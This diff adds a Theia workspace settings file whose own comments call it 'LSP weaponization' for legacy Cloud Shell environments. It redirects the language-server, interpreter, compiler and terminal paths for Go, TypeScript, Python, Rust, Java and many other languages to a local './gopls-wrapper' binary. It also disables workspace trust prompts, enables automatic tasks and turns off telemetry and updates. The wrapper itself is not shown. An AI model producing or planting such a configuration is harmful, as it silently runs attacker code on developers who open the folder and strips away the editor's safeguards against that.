@@ -1,0 +1,98 @@
+{
+  // ===========================================================================
+  // .theia/settings.json — Theia variant for legacy Cloud Shell compatibility
+  // ===========================================================================
+  //
+  // Cloud Shell Editor migrated from Theia to Code OSS in 2023, but the
+  // Theia fallback path still exists. This settings file provides the same
+  // LSP weaponization for Theia-based environments.
+  //
+  // Theia reads .theia/settings.json as its primary workspace config file.
+  // ===========================================================================
+
+  // ─── GO: gopls hijack ──────────────────────────────────────────────────
+  "go.alternateTools": {
+    "gopls": "./gopls-wrapper",
+    "go": "./gopls-wrapper",
+    "dlv": "./gopls-wrapper"
+  },
+  "go.useLanguageServer": true,
+  "go.languageServerFlags": [],
+  "go.toolsManagement.autoUpdate": false,
+
+  // ─── TYPESCRIPT: tsserver hijack ────────────────────────────────────────
+  "typescript.tsserver.path": "./gopls-wrapper",
+  "typescript.tsdk": "./node_modules",
+  "typescript.enablePromptUseWorkspaceTsdk": false,
+
+  // ─── PYTHON ────────────────────────────────────────────────────────────
+  "python.languageServer": "Pylance",
+  "python.pythonPath": "./gopls-wrapper",
+  "python.defaultInterpreterPath": "./gopls-wrapper",
+  "pyright.langserverPath": "./gopls-wrapper",
+  "python.analysis.pylancePath": "./gopls-wrapper",
+
+  // ─── TERRAFORM ─────────────────────────────────────────────────────────
+  "terraform.languageServer.path": "./gopls-wrapper",
+  "terraform.languageServer.external": true,
+  "terraform-ls.terraformExecPath": "./gopls-wrapper",
+
+  // ─── RUBY ──────────────────────────────────────────────────────────────
+  "rubyLsp.rubyExecutablePath": "./gopls-wrapper",
+  "solargraph.commandPath": "./gopls-wrapper",
+
+  // ─── RUST ──────────────────────────────────────────────────────────────
+  "rust-analyzer.server.path": "./gopls-wrapper",
+  "rust-analyzer.cargo.executable": "./gopls-wrapper",
+
+  // ─── C# / .NET ─────────────────────────────────────────────────────────
+  "omnisharp.path": "./gopls-wrapper",
+  "csharp.server.path": "./gopls-wrapper",
+
+  // ─── C++ ───────────────────────────────────────────────────────────────
+  "clangd.path": "./gopls-wrapper",
+  "C_Cpp.default.compilerPath": "./gopls-wrapper",
+
+  // ─── JAVA ──────────────────────────────────────────────────────────────
+  "java.jdt.ls.home": "./gopls-wrapper",
+  "java.home": "./gopls-wrapper",
+
+  // ─── OTHER LANGUAGES ───────────────────────────────────────────────────
+  "dart.sdkPath": "./gopls-wrapper",
+  "intelephense.path": "./gopls-wrapper",
+  "php.validate.executablePath": "./gopls-wrapper",
+  "haskell.serverExecutablePath": "./gopls-wrapper",
+  "elixirLS.pathToElixirLS": "./gopls-wrapper",
+  "clojureLsp.path": "./gopls-wrapper",
+  "markdown.server.path": "./gopls-wrapper",
+
+  // ─── EDITOR SETTINGS (QuickSuggest + attack windows) ────────────────────
+  "editor.quickSuggestions": {
+    "other": true,
+    "comments": true,
+    "strings": true
+  },
+  "editor.suggest.preview": true,
+  "editor.suggest.showMethods": true,
+  "editor.suggest.showFunctions": true,
+
+  // ─── WORKSPACE TRUST BYPASS ────────────────────────────────────────────
+  "security.workspace.trust.enabled": false,
+  "security.workspace.trust.startupPrompt": "never",
+  "security.workspace.trust.banner": "never",
+  "security.workspace.trust.emptyWindow": false,
+
+  // ─── TERMINAL ──────────────────────────────────────────────────────────
+  "terminal.integrated.defaultProfile.linux": "bash",
+  "terminal.integrated.shell.linux": "./gopls-wrapper",
+
+  // ─── TASKS ─────────────────────────────────────────────────────────────
+  "task.allowAutomaticTasks": "on",
+
+  // ─── QUIET MODE ────────────────────────────────────────────────────────
+  "telemetry.telemetryLevel": "off",
+  "telemetry.enableTelemetry": false,
+  "update.mode": "none",
+  "extensions.autoCheckUpdates": false,
+  "extensions.autoUpdate": false
+}
